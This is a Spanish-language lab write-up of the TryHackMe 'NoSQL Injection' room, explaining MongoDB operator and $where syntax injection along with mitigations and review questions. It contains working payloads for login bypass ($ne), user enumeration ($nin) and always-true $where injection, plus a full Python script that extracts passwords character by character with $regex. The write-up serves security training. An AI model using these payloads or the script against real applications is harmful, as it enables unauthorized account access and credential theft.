# Writeup: TryHackMe — NoSQL Injection

## Información
- **Plataforma:** TryHackMe
- **Room:** NoSQL Injection (`/room/nosqlinjectiontutorial`)
- **Path:** Web Application Pentesting
- **Dificultad:** Easy / Intermediate
- **Técnicas principales:** Operator Injection, $ne, $nin, $regex, Syntax Injection con $where
- **Fecha:** 2026-08-07

## Resumen ejecutivo

Room introductoria a NoSQL Injection centrada en MongoDB. Cubre Operator
Injection para bypass de login, enumeración de usuarios, extracción de
passwords vía regex, y Syntax Injection a través del operador `$where`.

## Conceptos clave

### NoSQL vs SQL

| SQL | MongoDB |
|---|---|
| Tablas | Colecciones |
| Filas | Documentos |
| `SELECT * FROM users WHERE name='admin'` | `db.users.find({"name":"admin"})` |
| `OR 1=1` | `{"$ne":null}` |
| `UNION SELECT` | No existe; se exfiltra con regex o `$where` |

### Tipos de NoSQL injection

1. **Operator Injection:** se inyectan operadores MongoDB en el filtro sin
   romper la sintaxis.
2. **Syntax Injection:** se rompe la sintaxis de una query JavaScript, típicamente
   usando `$where`.

### Operator Injection — bypass de login

Query vulnerable:

```php
$q = new MongoDB\Driver\Query([
  'username' => $user,
  'password' => $pass
]);
```

Payload POST:

```http
user[$ne]=xxx&pass[$ne]=xxx
```

PHP convierte esto en:

```php
$user = ['$ne' => 'xxx'];
$pass = ['$ne' => 'xxx'];
```

La query final:

```javascript
{ "username": { "$ne": "xxx" }, "password": { "$ne": "xxx" } }
```

Devuelve el primer usuario de la colección.

### $nin — enumeración de usuarios

Para excluir usuarios ya conocidos y pivotear al siguiente:

```http
user[$nin][]=admin&pass[$ne]=xxx
user[$nin][]=admin&user[$nin][]=jude&pass[$ne]=xxx
```

### $regex — extracción de passwords

Determinar longitud:

```http
user=admin&pass[$regex]=^.{5}$
```

Determinar carácter por carácter:

```http
user=admin&pass[$regex]=^a....$
user=admin&pass[$regex]=^b....$
```

Script Python de ejemplo:

```python
import requests
import string
import re

url = "http://MACHINE_IP/login.php"
username = "john"
charset = string.ascii_letters + string.digits + "!@#$%^&*-_+=?"
known = ""

def is_success(r):
    location = r.headers.get("Location", "")
    if "err=1" in location:
        return False
    return r.status_code == 302 and location != ""

# Averiguar longitud
length = 0
for i in range(1, 40):
    r = requests.post(url, data={
        "user": username,
        "pass[$regex]": f"^.{{{i}}}$",
        "remember": "on"
    }, allow_redirects=False)
    if is_success(r):
        length = i
        break

# Fuerza bruta carácter por carácter
while len(known) < length:
    for c in charset:
        payload = f"^{known}{re.escape(c)}{'.'*(length-len(known)-1)}$"
        r = requests.post(url, data={
            "user": username,
            "pass[$regex]": payload,
            "remember": "on"
        }, allow_redirects=False)
        if is_success(r):
            known += c
            break
```

### Syntax Injection con $where

Aplicación vulnerable:

```python
for x in mycol.find({"$where": "this.username == '" + username + "'"}):
    print(x['email'])
```

Detección:

```text
admin'
```

Explotación:

```text
admin' || 1 || '
```

La query JavaScript se convierte en:

```javascript
this.username == 'admin' || 1 || ''
```

Siempre verdadero → devuelve todos los documentos.

Condiciones booleanas:

```text
admin' && 0 && 'x   # falso, no devuelve nada
admin' && 1 && 'x   # verdadero, devuelve el email de admin
```

## Errores comunes y lecciones

### Error: `user=[$nin][]=jude`

El `=` entre `user` y `[` rompe la sintaxis del array. Debe ser:

```http
user[$nin][]=jude
```

### Error: 302 en login fallido y exitoso

En esta room, tanto el login exitoso como el fallido devuelven 302. La
diferencia está en el header `Location`:

- Fallido: `Location: /?err=1`
- Exitoso: `Location: /sekr3tPl4ce.php` (u otro path)

El script debe comparar el `Location`, no solo el status code.

### Error: `/login` no existe

El endpoint real era `/login.php`. Siempre capturar el request real con Burp
antes de asumir la URL.

### Error: usar `^.{N}$` sin considerar el Location

Si solo se verifica el status code 302, cualquier request parece exitosa. Hay
que verificar a dónde redirige.

## Variantes y uso real

- **Node.js con Express + Mongoose:** si `req.body` se pasa directamente a
  `find()`, puede ser vulnerable a Operator Injection.
- **APIs JSON:** enviar un objeto en vez de un string:
  ```json
  { "username": { "$ne": null }, "password": { "$ne": null } }
  ```
- **Bypass de rate limiting:** si la app bloquea intentos de login, NoSQLi
  puede permitir acceso sin adivinar credenciales.
- **Deserialización de objetos:** algunos frameworks deserializan JSON en
  objetos nativos, permitiendo inyección de operadores.

## Mitigaciones

1. **Usar filtros nativos:** nunca `$where` con input de usuario.
2. **Validar tipos:** si esperás un string, rechazá arrays u objetos.
3. **Queries parametrizadas:** aunque MongoDB no tiene prepared statements como
   SQL, las librerías modernas serializan correctamente los valores.
4. **Principio de mínimo privilegio:** la app no necesita permisos de admin en
   MongoDB.
5. **Evitar `$where`, `mapReduce`, `group` con JavaScript** si es posible.

## Herramientas usadas

- Burp Suite Proxy y Repeater.
- `curl` para requests manuales.
- Python + `requests` para automatizar extracción con `$regex`.
- `ssh` para acceder a la Syntax Injection task.

## Material de referencia

- MongoDB Operator Reference.
- TryHackMe NoSQL Injection room.
- PortSwigger Web Security Academy — NoSQL Injection topics.
- OWASP NoSQL Injection resources.

## Autoevaluación

1. ¿Cuál es la diferencia entre Operator Injection y Syntax Injection?
2. ¿Cómo envía PHP un array a través de un POST request?
3. ¿Por qué `user[$ne]=xxx&pass[$ne]=xxx` bypassa el login?
4. ¿Qué operador permite extraer passwords carácter por carácter?
5. ¿Por qué `$where` es peligroso si se concatena input de usuario?
6. ¿Cómo diferenciás un login exitoso de uno fallido si ambos devuelven 302?
